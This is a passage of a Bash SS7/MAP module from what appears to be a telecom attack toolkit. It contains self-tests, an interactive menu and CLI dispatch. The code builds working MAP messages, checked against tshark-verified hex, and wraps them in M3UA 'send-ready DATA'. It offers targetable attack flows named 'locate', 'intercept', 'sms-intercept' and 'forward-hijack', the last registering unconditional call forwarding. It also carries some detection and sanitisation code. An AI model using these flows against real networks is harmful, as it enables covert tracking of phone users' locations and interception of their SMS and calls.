    chk map-46  "$(ss7_map_opcode_name 46)"  "mo-ForwardSM"
    # An unassigned opcode must say so, not fall back to 0 or to a neighbour.
    chk map-unknown-250 "$(ss7_map_opcode_name 250)" "unassigned/unknown"
    chk map-unknown-9999 "$(ss7_map_opcode_name 9999)" "unassigned/unknown"
    chk map-known-22    "$(ss7_opcode_known 22 && echo yes || echo no)" "yes"
    chk map-known-250   "$(ss7_opcode_known 250 && echo yes || echo no)" "no"

    # ── 8. SS-Code table, known answers from tshark ─────────────────────
    # tshark decodes ss-Code 33 as "cfu - call forwarding unconditional (33)"
    # and 21 as "mci - malicious call identification (21)". The hijack needs
    # cfu = 33; a module that used 21 would register the wrong service.
    chk sscode-33 "$(ss7_ss_code_name 33)" "cfu"
    chk sscode-21 "$(ss7_ss_code_name 21)" "mci"
    chk sscode-41 "$(ss7_ss_code_name 41)" "cfb"
    chk sscode-42 "$(ss7_ss_code_name 42)" "cfnry"
    chk sscode-43 "$(ss7_ss_code_name 43)" "cfnrc"
    chk sscode-unknown "$(ss7_ss_code_name 99)" "unknown"
    # The table the clause fills to 72 rows: each group's umbrella value, the
    # barring set the module used to stop at (144-155), and the last value.
    chk sscode-144 "$(ss7_ss_code_name 144)" "allBarringSS"
    chk sscode-146 "$(ss7_ss_code_name 146)" "baoc"
    chk sscode-153 "$(ss7_ss_code_name 153)" "barringOfIncomingCalls"
    chk sscode-130 "$(ss7_ss_code_name 130)" "uus2"
    chk sscode-131 "$(ss7_ss_code_name 131)" "uus3"
    chk sscode-161 "$(ss7_ss_code_name 161)" "emlpp"
    chk sscode-177 "$(ss7_ss_code_name 177)" "universal"
    chk sscode-178 "$(ss7_ss_code_name 178)" "callSessionRelated"
    chk sscode-193 "$(ss7_ss_code_name 193)" "basicSelfLocation"
    chk sscode-240 "$(ss7_ss_code_name 240)" "allPLMN-specificSS"
    chk sscode-255 "$(ss7_ss_code_name 255)" "plmn-specificSS-F"
    # 104 rows: 70 assigned operations, 11 the clause names as withdrawn and
    # 23 more that only the dissector still names.
    chk map-38 "$(ss7_map_opcode_name 38)" "forwardCheckSS-Indication"
    chk map-115 "$(ss7_map_opcode_name 115)" "lcs-MOLR"
    chk map-117 "$(ss7_map_opcode_name 117)" "callDeflection"
    chk map-124 "$(ss7_map_opcode_name 124)" "buildMPTY"
    chk map-126 "$(ss7_map_opcode_name 126)" "explicitCT"
    chk map-127 "$(ss7_map_opcode_name 127)" "unassigned/unknown"
    chk sscode-count "$(for i in $(seq 0 255); do ss7_ss_code_name "$i"; done | grep -cv '^unknown$')" "72"
    chk map-count "$(for i in $(seq 0 255); do ss7_map_opcode_name "$i"; done | grep -cv '^unassigned/unknown$')" "104"

    # ── 9. Builders round-trip through the decoder ──────────────────────
    # The tshark-verified invoke for registerSS with cfu + forwardedToNumber:
    #   A1 14 02 01 02 02 01 0A 30 0C 04 01 21 84 07 913306000000F0
    # (opcode 10, ss-Code 0x21 = 33, [4] forwardedToNumber).
    local inv
    inv=$(ss7_map_invoke 2 10 "$(ss7_arg_register_ss 33 33600000000)")
    chk invoke-register-ss-hex "$inv" "A11402010202010A300C0401218407913306000000F0"
    # The tshark-verified SAI invoke (opcode 56, [0] imsi, INTEGER 5):
    #   A1 15 02 01 01 02 01 38 30 0D 80 08 13100521436587F9 02 01 05
    inv=$(ss7_map_invoke 1 56 "$(ss7_arg_sai 310150123456789 5)")
    chk invoke-sai-hex "$inv" "A115020101020138300D800813100521436587F9020105"
    chk msisdn-hex "$(ss7_msisdn_hex 33612345678)" "913316325476F8"
    chk msisdn-bad "$(ss7_msisdn_hex '' >/dev/null 2>&1; echo $?)" "1"
    chk imsi-hex   "$(ss7_imsi_hex 310150123456789)" "13100521436587F9"
    chk imsi-bad   "$(ss7_imsi_hex 12 >/dev/null 2>&1; echo $?)" "1"
    # A built SRI must decode back to opcode 22 with the right MSISDN present.
    local msu
    msu=$(ss7_build_sri 33612345678)
    out=$(ss7_cmd_decode_map "$msu")
    chk map-sri-op    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="component"{print $5}')" "22"
    chk map-sri-opname "$(printf '%s\n' "$out" | awk -F'\t' '$1=="component"{print $6}')" "sendRoutingInfo"
    chk map-sri-sccp  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="called_ssn"{print $2}')" "6"
    # Decoding a full MSU must walk MTP3 -> SCCP -> TCAP.
    out=$(ss7_cmd_decode_map "$msu")
    chk msu-sio-si "$(printf '%s\n' "$out" | awk -F'\t' '$1=="si"{print $2}')" "3"
    chk msu-dpc    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="dpc"{print $2}')" "1"

    # ── 10. Flows: every flow emits a real opcode sequence, all different ─
    # The sequences are the published ones: SRI+PSI, SRI+ATI, SRI-SM+MT-FSM,
    # registerSS+activateSS. Asserting the literal values catches a flow that
    # silently starts emitting a different opcode pair.
    local f seq all="" n=0 i j
    for f in intercept locate sms-intercept forward-hijack; do
        seq=$(ss7_flow_opcodes "$f") || { printf 'flow-%s\tFAIL no sequence\n' "$f"; bad=$((bad+1)); continue; }
        case "$f" in
            intercept)      chk "flow-$f-seq" "$seq" "22,70" ;;
            locate)         chk "flow-$f-seq" "$seq" "22,71" ;;
            sms-intercept)  chk "flow-$f-seq" "$seq" "45,44" ;;
            forward-hijack) chk "flow-$f-seq" "$seq" "10,12" ;;
        esac
        out=$(ss7_flow "$f"); rc=$?
        chk "flow-$f-rc" "$rc" "0"
        chk "flow-$f-steps" "$(printf '%s\n' "$out" | grep -c '^step_hex')" "2"
        # every step must decode back to the opcode the sequence claims
        local k=0 opline hexline opdec
        for k in 1 2; do
            hexline=$(printf '%s\n' "$out" | awk -F'\t' -v i="$k" '$1=="step_hex" && $2==i{print $3}')
            opline=$(printf '%s' "$seq" | cut -d, -f"$k")
            opdec=$(ss7_cmd_decode_map "$hexline" | awk -F'\t' '$1=="component"{print $5; exit}')
            chk "flow-$f-step$k-opcode" "$opdec" "$opline"
        done
        all+="$seq;"
        n=$(( n + 1 ))
    done
    chk flow-count "$n" "4"
    # All four sequences must differ pairwise.
    chk flows-distinct "$(printf '%s' "$all" | tr ';' '\n' | sort -u | grep -c .)" "4"
    chk flow-unknown-rc "$(ss7_flow nope >/dev/null 2>&1; echo $?)" "2"

    # ── 11. Detection fires and abstains, both directions ───────────────
    # ATI (71) from the GMLC SSN 145 is normal; from SSN 8 it is the anomaly.
    out=$(printf '1\t145\t6\t71\n' | ss7_detect_stream)
    chk detect-ati-gmlc-quiet "$(printf '%s' "$out" | grep -c 'ati-from-non-gmlc')" "0"
    out=$(printf '2\t8\t6\t71\n' | ss7_detect_stream)
    chk detect-ati-bad-ssn "$(printf '%s' "$out" | grep -c 'ati-from-non-gmlc')" "1"
    # SRI from an MSC is normal; from SSN 145 is not.
    out=$(printf '3\t8\t6\t22\n' | ss7_detect_stream)
    chk detect-sri-ok "$(printf '%s' "$out" | grep -c 'sri-from-unexpected-ssn')" "0"
    out=$(printf '4\t145\t6\t22\n' | ss7_detect_stream)
    chk detect-sri-bad "$(printf '%s' "$out" | grep -c 'sri-from-unexpected-ssn')" "1"
    # The forwarding hijack primitives always flag.
    out=$(printf '5\t8\t6\t12\n' | ss7_detect_stream)
    chk detect-forwarding "$(printf '%s' "$out" | grep -c 'forwarding-registration')" "1"
    # An unassigned opcode reports unknown.
    out=$(printf '6\t8\t6\t250\n' | ss7_detect_stream)
    chk detect-unknown-op "$(printf '%s' "$out" | grep -c 'unknown-opcode')" "1"
    # A flood is a rate finding, not a per-message one.
    seq=""
    for i in $(seq 1 60); do seq+="$i	8	6	22
"; done
    out=$(printf '%s' "$seq" | ss7_detect_stream)
    chk detect-flood "$(printf '%s' "$out" | grep -c 'opcode-flood')" "1"
    # A quiet capture produces no findings at all.
    out=$(printf '1\t8\t6\t22\n2\t7\t6\t2\n' | ss7_detect_stream)
    chk detect-clean "$(printf '%s' "$out" | grep -c '^FINDING')" "0"

    # ── 12. GRX reference is emitted without a capture ──────────────────
    out=$(ss7_grx_recon); rc=$?
    chk grx-rc        "$rc" "0"
    chk grx-trust     "$(fld "$out" trust_model)" "peer is authorised by contract, not by message"
    chk grx-transport "$(fld "$out" transport)" "GTP-C UDP 2123, GTP-U UDP 2152, SCTP 2905/2904 (M3UA/M2PA)"
    chk grx-missing   "$(ss7_grx_recon /nonexistent.pcap >/dev/null 2>&1; echo $?)" "1"

    # ── 13. Plans carry status: handoff ─────────────────────────────────
    local pf
    pf=$(ss7_cmd_plan stp-lab); rc=$?
    chk plan-stp-rc     "$rc" "0"
    chk plan-stp-status "$(printf '%s\n' "$pf" | awk -F'\t' '$1=="status"{print $2}')" "handoff"
    local file; file=$(printf '%s\n' "$pf" | awk -F'\t' '$1=="plan_file"{print $2}')
    chk plan-stp-file   "$(grep -c '^status: handoff' "$file")" "1"
    chk plan-stp-needs  "$(grep -q 'M3UA/SCTP 2905' "$file" && echo yes || echo no)" "yes"
    pf=$(ss7_cmd_plan ipx-path); rc=$?
    chk plan-ipx-rc     "$rc" "0"
    file=$(printf '%s\n' "$pf" | awk -F'\t' '$1=="plan_file"{print $2}')
    chk plan-ipx-file   "$(grep -c '^status: handoff' "$file")" "1"
    chk plan-ipx-needs  "$(grep -q 'IPX' "$file" && echo yes || echo no)" "yes"
    chk plan-unknown    "$(ss7_cmd_plan nope >/dev/null 2>&1; echo $?)" "2"

    # ── 14. Argument validation returns non-zero ────────────────────────
    chk val-build-sri-nomsisdn "$(ss7_cmd_build_sri >/dev/null 2>&1; echo $?)" "2"
    chk val-build-sri-bad      "$(ss7_cmd_build_sri notanumber >/dev/null 2>&1; echo $?)" "1"
    chk val-build-sri-sm-none  "$(ss7_cmd_build_sri_sm >/dev/null 2>&1; echo $?)" "2"
    chk val-build-ati-none     "$(ss7_cmd_build_ati >/dev/null 2>&1; echo $?)" "2"
    chk val-build-ati-bad      "$(ss7_cmd_build_ati 12 >/dev/null 2>&1; echo $?)" "1"
    chk val-decode-tcap-none   "$(ss7_cmd_decode_tcap >/dev/null 2>&1; echo $?)" "2"
    chk val-decode-tcap-bad    "$(ss7_cmd_decode_tcap zzzz >/dev/null 2>&1; echo $?)" "1"
    chk val-decode-map-none    "$(ss7_cmd_decode_map >/dev/null 2>&1; echo $?)" "2"
    chk val-decode-map-bad     "$(ss7_cmd_decode_map 99 >/dev/null 2>&1; echo $?)" "1"
    chk val-flow-none          "$(ss7_cmd_flow >/dev/null 2>&1; echo $?)" "2"
    chk val-ssn-range          "$(ss7_cmd_ssn 300 >/dev/null 2>&1; echo $?)" "2"
    chk val-pc-range           "$(ss7_cmd_pc 99999 >/dev/null 2>&1; echo $?)" "2"

    # ── 15. Status TSV contract ─────────────────────────────────────────
    out=$(ss7_cli_status_tsv)
    chk status-module "$(fld "$out" module)" "ss7_map"
    chk status-tag    "$(fld "$out" tag)"    "ss7"
    chk status-dir    "$(fld "$out" dir)"    "$SS7_DIR"
    chk status-flowset "$(fld "$out" flows)" "intercept,locate,sms-intercept,forward-hijack"

    # ── 16. A TSV row must not be forgeable by a hostile MNC/name ───────
    local evil
    evil=$(ss7_sanitize $'Evil\tOperator\nRow')
    chk sanitize-tabs "$(printf '%s' "$evil" | tr -cd '\t' | wc -c)" "0"
    chk sanitize-nl   "$(printf '%s' "$evil" | wc -l)" "0"
    chk sanitize-lf   "$(printf '%s' "$evil" | tr -cd '\n' | wc -c)" "0"
    SS7_F=()
    ss7_split $'a\t\tc\td'
    chk split-empty-preserved "${#SS7_F[@]}" "4"
    chk split-field2          "${SS7_F[1]}" ""
    chk split-field3          "${SS7_F[2]:-x}" "c"

    # ── Diameter<->SS7 fallback and Visited-PLMN spoof ──────────────────
    chk vplmn-208-01 "$(ss7_visited_plmn 02F810 | awk -F'\t' '$1=="plmn"{print $2}')" "208-01"
    chk vplmn-0000 "$(ss7_visited_plmn 000000 | awk -F'\t' '$1=="finding"{print $2}')" "HIGH"
    chk vplmn-bad "$(ss7_visited_plmn 00 >/dev/null 2>&1; echo $?)" "2"
    printf 'ts\tproto\tsubscriber\taction\n' > "$d/fb.tsv"
    printf 't1\tDiameter\t310260000000001\tlocation\n' >> "$d/fb.tsv"
    printf 't2\tSS7\t310260000000001\tlocation\n' >> "$d/fb.tsv"
    printf 't3\tSS7\t310260000000002\tlocation\n' >> "$d/fb.tsv"
    chk fb-detected "$(ss7_fallback_detect "$d/fb.tsv" | awk -F'\t' '$1=="310260000000001"{n++} END{print n+0}')" "1"
    chk fb-not-b "$(ss7_fallback_detect "$d/fb.tsv" | awk -F'\t' '$1=="310260000000002"{n++} END{print n+0}')" "0"
    chk fb-missing "$(ss7_fallback_detect "$d/none.tsv" >/dev/null 2>&1; echo $?)" "1"

    # ── 17. The MAP builders that had no CLI verb ───────────────────────
    # Each verb must name its operation AND round-trip through the decoder:
    # the round trip is what proves the builder and the parser still agree.
    local spec avbv avop
    for spec in "sai 56 310150123456789" "psi 70 310150123456789" \
                "ulr 2 310150123456789" "isd 7 310150123456789"; do
        set -- $spec
        avbv=$1; avop=$2
        out=$(ss7_cmd_build_extra "$avbv" "$3"); rc=$?
        chk "extra-$avbv-rc" "$rc" "0"
        chk "extra-$avbv-op" "$(fld "$out" opcode)" "$avop"
        chk "extra-$avbv-rt" "$(fld "$out" roundtrip_opcode)" "$avop"
    done
    set -- $spec
    out=$(ss7_cmd_build_extra register-ss 33 33600000000)
    chk extra-rss-op "$(fld "$out" opcode)" "10"
    chk extra-rss-rt "$(fld "$out" roundtrip_opcode)" "10"
    chk extra-rss-ss "$(fld "$out" ss_name)" "cfu"
    out=$(ss7_cmd_build_extra activate-ss 33)
    chk extra-ass-op "$(fld "$out" opcode)" "12"
    chk extra-ass-rt "$(fld "$out" roundtrip_opcode)" "12"
    # The vector count is a real argument, not decoration.
    local sai5 sai9
    sai5=$(ss7_cmd_build_extra sai 310150123456789 5)
    sai9=$(ss7_cmd_build_extra sai 310150123456789 9)
    chk extra-sai-vectors "$([[ "$(fld "$sai5" hex)" != "$(fld "$sai9" hex)" ]] && echo differ || echo same)" "differ"
    chk val-extra-sai-none  "$(ss7_cmd_build_extra sai >/dev/null 2>&1; echo $?)" "2"
    chk val-extra-sai-badn  "$(ss7_cmd_build_extra sai 310150123456789 x >/dev/null 2>&1; echo $?)" "2"
    chk val-extra-psi-none  "$(ss7_cmd_build_extra psi >/dev/null 2>&1; echo $?)" "2"
    chk val-extra-isd-bad   "$(ss7_cmd_build_extra isd 12 >/dev/null 2>&1; echo $?)" "1"
    chk val-extra-rss-range "$(ss7_cmd_build_extra register-ss 999 >/dev/null 2>&1; echo $?)" "2"
    chk val-extra-verb-bad  "$(ss7_cmd_build_extra nope >/dev/null 2>&1; echo $?)" "2"

    # ── 18. --flow is targetable ────────────────────────────────────────
    out=$(ss7_flow locate)
    chk flow-default-opc    "$(fld "$out" opc)"    "2"
    chk flow-default-dpc    "$(fld "$out" dpc)"    "1"
    chk flow-default-msisdn "$(fld "$out" msisdn)" "33612345678"
    out=$(ss7_flow locate 447700900123 234150999999999 1234 4321)
    chk flow-custom-opc    "$(fld "$out" opc)"    "1234"
    chk flow-custom-dpc    "$(fld "$out" dpc)"    "4321"
    chk flow-custom-msisdn "$(fld "$out" msisdn)" "447700900123"
    chk flow-custom-imsi   "$(fld "$out" imsi)"   "234150999999999"
    # The point codes must be IN the built routing label, not merely printed
    # beside it: the label is the only place the network reads them.
    local fhex flab
    fhex=$(printf '%s\n' "$out" | awk -F'\t' '$1=="step_hex" && $2==1{print $3}')
    flab="${fhex:2:8}"
    chk flow-label-dpc "$(ss7_label_parse "$flab" | awk -F'\t' '$1=="dpc"{print $2}')" "4321"
    chk flow-label-opc "$(ss7_label_parse "$flab" | awk -F'\t' '$1=="opc"{print $2}')" "1234"
    chk val-flow-bad-pc     "$(ss7_flow locate 447700900123 234150999999999 99999 1 >/dev/null 2>&1; echo $?)" "2"
    chk val-flow-bad-imsi   "$(ss7_flow locate 447700900123 nope >/dev/null 2>&1; echo $?)" "2"
    chk val-flow-bad-msisdn "$(ss7_flow locate nope 234150999999999 >/dev/null 2>&1; echo $?)" "2"

    # ── 19. SIGTRAN: SCTP + M3UA (RFC 4960 §3, RFC 4666 §3) ─────────────
    local msu m3ua m3ua0
    msu=$(ss7_build_ati 310150123456789)
    m3ua0=$(ss7_build_m3ua "$msu")
    chk m3ua-version  "${m3ua0:0:2}" "01"
    chk m3ua-reserved "${m3ua0:2:2}" "00"
    chk m3ua-class    "${m3ua0:4:2}" "01"
    chk m3ua-type     "${m3ua0:6:2}" "01"
    # Message Length counts the whole message including parameter padding.
    chk m3ua-length   "$(( 16#${m3ua0:8:8} ))" "$(( ${#m3ua0} / 2 ))"
    # Parameter Length is 16 bits and counts its own 4-octet header but NOT
    # the padding; reading it as 32 bits is the bug this asserts against.
    chk m3ua-pd-tag   "${m3ua0:16:4}" "0210"
    chk m3ua-pd-len   "$(( 16#${m3ua0:20:4} ))" "$(( ${#msu} / 2 + 4 ))"
    chk m3ua-pd-value "${m3ua0:24:${#msu}}" "$msu"
    # The MSU already carries SIO + routing label, so the wrapper must not
    # restate a point code: a caller-supplied OPC/DPC could contradict it.
    chk m3ua-no-pc-args "$(printf '%s\n' "$msu" | grep -q . && echo ok)" "ok"
    chk m3ua-short-msu  "$(ss7_build_m3ua 83 >/dev/null 2>&1; echo $?)" "1"
    chk m3ua-bad-hex    "$(ss7_build_m3ua zz >/dev/null 2>&1; echo $?)" "2"
    m3ua=$(ss7_build_m3ua "$msu" 7)
    out=$(ss7_m3ua_parse "$m3ua")
    chk m3ua-parse-class "$(fld "$out" m3ua_class_name)" "Transfer"
    chk m3ua-parse-type  "$(fld "$out" m3ua_type_name)"  "DATA"
    chk m3ua-parse-rc    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="param_name"{print $2}' | head -1)" "Routing Context (0x0006)"
    chk m3ua-roundtrip   "$(fld "$out" protocol_data)" "$msu"
    chk val-m3ua-none    "$(ss7_cmd_build_m3ua >/dev/null 2>&1; echo $?)" "2"

    # An SCTP datagram built here from the wire definition, not by the module:
    # common header 12 octets, one DATA chunk (type 0, flags 3), PPID 3.
    local mlen dlen dpad dchunk datagram
    mlen=$(( ${#m3ua} / 2 ))
    dlen=$(( 16 + mlen ))
    dpad=$(( ( 4 - dlen % 4 ) % 4 ))
    dchunk="0003$(printf '%04X' "$dlen")112233440005000900000003${m3ua}"
    (( dpad > 0 )) && dchunk+=$(printf '%0*d' "$(( dpad * 2 ))" 0)
    datagram="0B590B59DEADBEEF00000000${dchunk}"
    out=$(ss7_cmd_decode_sigtran "$datagram"); rc=$?
    chk sigtran-rc      "$rc" "0"
    chk sigtran-sport   "$(fld "$out" sctp_sport)"  "2905"
    chk sigtran-dport   "$(fld "$out" sctp_dport)"  "2905"
    chk sigtran-vtag    "$(fld "$out" sctp_vtag)"   "0xDEADBEEF"
    chk sigtran-chunk   "$(fld "$out" chunk_name)"  "DATA"
    chk sigtran-tsn     "$(fld "$out" data_tsn)"    "287454020"
    chk sigtran-stream  "$(fld "$out" data_stream)" "5"
    chk sigtran-ssn     "$(fld "$out" data_ssn)"    "9"
    chk sigtran-ppid    "$(fld "$out" data_ppid)"   "3"
    chk sigtran-ppidn   "$(fld "$out" data_ppid_name)" "M3UA"
    chk sigtran-pd      "$(fld "$out" protocol_data)" "$msu"
    chk sigtran-layers  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="layer"{print $2}' | paste -sd, -)" "sctp,m3ua,mtp3,sccp,tcap"
    chk val-sigtran-none  "$(ss7_cmd_decode_sigtran >/dev/null 2>&1; echo $?)" "2"
    chk val-sigtran-bad   "$(ss7_cmd_decode_sigtran zz >/dev/null 2>&1; echo $?)" "1"
    chk val-sigtran-short "$(ss7_cmd_decode_sigtran 0011 >/dev/null 2>&1; echo $?)" "1"

    # ── 20. --detect names the peer, not just the message shape ─────────
    out=$(printf '7\t9\t6\t22\t101\t201\t447700900123\t447700900999\n' | ss7_detect_stream)
    chk detect-route-opc "$(printf '%s\n' "$out" | grep -c 'OPC 101 -> DPC 201')" "1"
    chk detect-route-gt  "$(printf '%s\n' "$out" | grep -c 'called GT 447700900999')" "1"
    out=$(printf '7\t9\t6\t22\t101\t201\n' | ss7_detect_stream)
    chk detect-first-query "$(printf '%s\n' "$out" | grep -c 'first-message-is-a-query')" "1"
    # A capture without the MTP3 fields still decodes, and must not invent a
    # point code it never saw.
    out=$(printf '7\t9\t6\t22\n' | ss7_detect_stream)
    chk detect-4col-finding "$(printf '%s\n' "$out" | grep -c '^FINDING')" "1"
    chk detect-4col-no-pc   "$(printf '%s\n' "$out" | grep -c 'OPC')" "0"
    chk detect-4col-no-first "$(printf '%s\n' "$out" | grep -c 'first-message')" "0"

    rm -rf "$d"
    trap - EXIT
    [[ -n "$_prev_trap" ]] && eval "$_prev_trap"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ── menu ────────────────────────────────────────────────────────────────
ss7_menu() {
    local c p h
    while true; do
        banner
        echo -e "  ${C_MAG}=== SS7 / MAP ===${C_RESET}"
        echo -e "  stp:   ${C_GRN}$(ss7_find_stp 2>/dev/null || echo none)${C_RESET}"
        echo -e "  plans: ${C_GRN}$(find "$SS7_PLANS" -name '*.plan' -type f 2>/dev/null | wc -l)${C_RESET}"
        echo -e "  dir:   ${C_DIM}$SS7_PLANS${C_RESET}\n"
        cat << 'M'
  [1]  decode an MSU (MTP3 + SCCP)
  [2]  decode TCAP (hex)
  [3]  decode MAP (hex, auto-unwraps MSU/SCCP)
  [4]  build SRI (sendRoutingInfo) for an MSISDN
  [5]  build SRI-SM (sendRoutingInfoForSM) for an MSISDN
  [6]  build ATI (anyTimeInterrogation) for an IMSI
  [7]  flow: intercept (SRI + PSI)
  [8]  flow: locate (SRI + ATI)
  [9]  flow: sms-intercept (SRI-SM + MT-ForwardSM)
  [10] flow: forward-hijack (registerSS + activateSS)
  [11] GRX/IPX recon (reference, or a pcap)
  [12] SCCP SSN reference
  [13] point-code formatter
  [14] attack surface notes
  [15] plan: lab STP
  [16] plan: IPX/GRX path
  [17] build SAI (sendAuthenticationInfo) for an IMSI
  [18] build PSI (provideSubscriberInfo) for an IMSI
  [19] build ULR (updateLocation) for an IMSI
  [20] build ISD (insertSubscriberData) for an IMSI
  [21] build RegisterSS + ActivateSS (call-forwarding setup)
  [22] decode a SIGTRAN chunk (SCTP + M3UA, then the MSU)
  [23] wrap an MSU in M3UA (send-ready DATA)
  [24] detect HLR-side anomalies in a pcap
  [25] sweep a TSV of Diameter/SS7 events for a fallback pivot
  [26] decode a Diameter Visited-PLMN-Id
  [27] MAP opcode reference
  [28] status
  [0]  back

M
        read -rp "  choice> " c || return 0  # EOF: leave the menu cleanly
        case "$c" in
            1) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need hex; cannot prompt in CLI mode" >&2
               else read -rp "  MSU hex> " h; ss7_cmd_decode_msu "$h" | column -t -s$'\t' 2>/dev/null || ss7_cmd_decode_msu "$h"
                    read -rp "  press enter " _; fi ;;
            2) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need hex; cannot prompt in CLI mode" >&2
               else read -rp "  TCAP hex> " h; ss7_cmd_decode_tcap "$h" | column -t -s$'\t' 2>/dev/null || ss7_cmd_decode_tcap "$h"
                    read -rp "  press enter " _; fi ;;
            3) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need hex; cannot prompt in CLI mode" >&2
               else read -rp "  MAP hex> " h; ss7_cmd_decode_map "$h" | column -t -s$'\t' 2>/dev/null || ss7_cmd_decode_map "$h"
                    read -rp "  press enter " _; fi ;;
            4) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an MSISDN; cannot prompt in CLI mode" >&2
               else read -rp "  MSISDN> " p; ss7_cmd_build_sri "$p"; read -rp "  press enter " _; fi ;;
            5) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an MSISDN; cannot prompt in CLI mode" >&2
               else read -rp "  MSISDN> " p; ss7_cmd_build_sri_sm "$p"; read -rp "  press enter " _; fi ;;
            6) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an IMSI; cannot prompt in CLI mode" >&2
               else read -rp "  IMSI> " p; ss7_cmd_build_ati "$p"; read -rp "  press enter " _; fi ;;
            7) ss7_cmd_flow intercept; read -rp "  press enter " _ ;;
            8) ss7_cmd_flow locate; read -rp "  press enter " _ ;;
            9) ss7_cmd_flow sms-intercept; read -rp "  press enter " _ ;;
            10) ss7_cmd_flow forward-hijack; read -rp "  press enter " _ ;;
            11) ss7_grx_recon | column -t -s$'\t' 2>/dev/null || ss7_grx_recon
                read -rp "  press enter " _ ;;
            12) local i; for i in 0 1 3 4 5 6 7 8 9 10 11 12 13 14 142 143 145 146 147 148 149 150 248 249 250 251 252 253 254; do
                    printf '%s\t%s\n' "$i" "$(ss7_ssn_name "$i")"
                done | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            13) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need a point code; cannot prompt in CLI mode" >&2
                else read -rp "  pc (0-16383)> " p; read -rp "  structure [3-8-3]> " s
                     ss7_cmd_pc "$p" "${s:-3-8-3}"; read -rp "  press enter " _; fi ;;
            14) ss7_surface_notes | column -t -s$'\t' 2>/dev/null || ss7_surface_notes
                read -rp "  press enter " _ ;;
            15) ss7_cmd_plan stp-lab; read -rp "  press enter " _ ;;
            16) ss7_cmd_plan ipx-path; read -rp "  press enter " _ ;;
            17) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an IMSI; cannot prompt in CLI mode" >&2
                else read -rp "  IMSI> " p; read -rp "  vectors [5]> " s
                     ss7_cmd_build_extra sai "$p" "${s:-5}"; read -rp "  press enter " _; fi ;;
            18) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an IMSI; cannot prompt in CLI mode" >&2
                else read -rp "  IMSI> " p; ss7_cmd_build_extra psi "$p"; read -rp "  press enter " _; fi ;;
            19) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an IMSI; cannot prompt in CLI mode" >&2
                else read -rp "  IMSI> " p; read -rp "  MSC number (optional)> " s
                     read -rp "  VLR number (optional)> " h
                     ss7_cmd_build_extra ulr "$p" "$s" "$h"; read -rp "  press enter " _; fi ;;
            20) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an IMSI; cannot prompt in CLI mode" >&2
                else read -rp "  IMSI> " p; ss7_cmd_build_extra isd "$p"; read -rp "  press enter " _; fi ;;
            21) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an SS code; cannot prompt in CLI mode" >&2
                else read -rp "  SS code [33 = cfu]> " p; read -rp "  forwarded number (optional)> " s
                     ss7_cmd_build_extra register-ss "${p:-33}" "$s"
                     ss7_cmd_build_extra activate-ss "${p:-33}"
                     read -rp "  press enter " _; fi ;;
            22) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need hex; cannot prompt in CLI mode" >&2
                else read -rp "  SIGTRAN hex> " h; ss7_cmd_decode_sigtran "$h" | column -t -s$'\t' 2>/dev/null || ss7_cmd_decode_sigtran "$h"
                     read -rp "  press enter " _; fi ;;
            23) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need hex; cannot prompt in CLI mode" >&2
                else read -rp "  MSU hex> " h; read -rp "  routing context (optional)> " p
                     ss7_cmd_build_m3ua "$h" "$p"; read -rp "  press enter " _; fi ;;
            24) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need a pcap; cannot prompt in CLI mode" >&2
                else read -rp "  pcap> " h; ss7_cmd_detect "$h" | column -t -s$'\t' 2>/dev/null || ss7_cmd_detect "$h"
                     read -rp "  press enter " _; fi ;;
            25) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need a TSV; cannot prompt in CLI mode" >&2
                else read -rp "  events TSV> " h; ss7_fallback_detect "$h"; read -rp "  press enter " _; fi ;;
            26) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need hex; cannot prompt in CLI mode" >&2
                else read -rp "  Visited-PLMN hex> " h; ss7_visited_plmn "$h"; read -rp "  press enter " _; fi ;;
            27) local i; for i in 2 7 10 12 22 44 45 46 56 62 70 71 83 85; do
                    printf '%s\t%s\n' "$i" "$(ss7_map_opcode_name "$i")"
                done | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            28) ss7_cli_status_tsv | column -t -s$'\t' 2>/dev/null || ss7_cli_status_tsv
                read -rp "  press enter " _ ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

# ── CLI dispatch ────────────────────────────────────────────────────────
ss7_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)    ss7_cli_status_tsv ;;
        --decode-msu)    ss7_cmd_decode_msu "${1:-}" ;;
        --decode-tcap)   ss7_cmd_decode_tcap "${1:-}" ;;
        --decode-sigtran) ss7_cmd_decode_sigtran "${1:-}" ;;
        --build-m3ua)    ss7_cmd_build_m3ua "${1:-}" "${2:-}" "${3:-}" ;;
        --decode-map)    ss7_cmd_decode_map "${1:-}" ;;
        --build-sri)     ss7_cmd_build_sri "${1:-}" ;;
        --build-sri-sm)  ss7_cmd_build_sri_sm "${1:-}" ;;
        --build-ati)     ss7_cmd_build_ati "${1:-}" ;;
        --build-sai)         ss7_cmd_build_extra sai "${1:-}" "${2:-}" ;;
        --build-psi)         ss7_cmd_build_extra psi "${1:-}" ;;
        --build-ulr)         ss7_cmd_build_extra ulr "${1:-}" "${2:-}" "${3:-}" ;;
